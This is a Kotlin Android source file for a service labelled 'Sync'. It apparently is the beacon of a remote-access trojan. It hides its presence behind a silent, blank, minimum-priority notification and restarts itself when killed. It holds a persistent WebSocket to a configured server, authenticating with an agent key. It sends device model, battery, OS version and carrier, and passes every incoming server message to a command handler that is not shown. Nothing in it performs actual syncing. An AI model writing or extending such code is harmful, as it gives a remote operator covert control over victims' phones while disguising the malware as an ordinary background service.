package com.sync.service

import android.app.*
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.*
import okhttp3.*
import java.util.concurrent.TimeUnit

class SyncService : Service() {
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var ws: WebSocket? = null
    private var retry = 1000L
    private val client = OkHttpClient.Builder()
        .pingInterval(30, TimeUnit.SECONDS)
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(0, TimeUnit.MILLISECONDS)
        .build()

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        startFg()
        connect()
    }

    override fun onStartCommand(i: Intent?, f: Int, s: Int): Int {
        if (ws == null) connect()
        return START_STICKY
    }

    private fun startFg() {
        val ch = "sync_ch"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val c = NotificationChannel(ch, "Sync", NotificationManager.IMPORTANCE_MIN)
            getSystemService(NotificationManager::class.java).createNotificationChannel(c)
        }
        val n = NotificationCompat.Builder(this, ch)
            .setContentTitle("Sync")
            .setContentText("")
            .setSmallIcon(android.R.drawable.stat_sys_upload)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .setSilent(true)
            .setShowWhen(false)
            .build()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q)
            startForeground(1, n, android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
        else startForeground(1, n)
    }

    private fun connect() {
        val req = Request.Builder()
            .url(BuildConfig.SERVER_URL)
            .addHeader("X-Agent-Key", BuildConfig.AGENT_SECRET)
            .addHeader("model", "${Build.MANUFACTURER}${Build.MODEL}")
            .addHeader("battery", DeviceInfo.getBattery(this))
            .addHeader("version", "Android ${Build.VERSION.RELEASE}")
            .addHeader("provider", DeviceInfo.getProvider(this))
            .build()

        ws = client.newWebSocket(req, object : WebSocketListener() {
            override fun onOpen(w: WebSocket, r: Response) { retry = 1000L }
            override fun onMessage(w: WebSocket, t: String) {
                try {
                    AdvancedHandler(this@SyncService, w).handle(t)
                } catch (e: Exception) {}
            }
            override fun onFailure(w: WebSocket, e: Throwable, r: Response?) {
                ws = null
                scheduleReconnect()
            }
            override fun onClosed(w: WebSocket, c: Int, r: String) {
                ws = null
                scheduleReconnect()
            }
        })
    }

    private fun scheduleReconnect() {
        scope.launch {
            delay(retry)
            retry = (retry * 2).coerceAtMost(60000L)
            connect()
        }
    }

    override fun onDestroy() {
        ws?.close(1000, "Destroy")
        scope.cancel()
        super.onDestroy()
    }

    companion object {
        fun start(c: Context) {
            val i = Intent(c, SyncService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) c.startForegroundService(i) else c.startService(i)
        }
    }
}
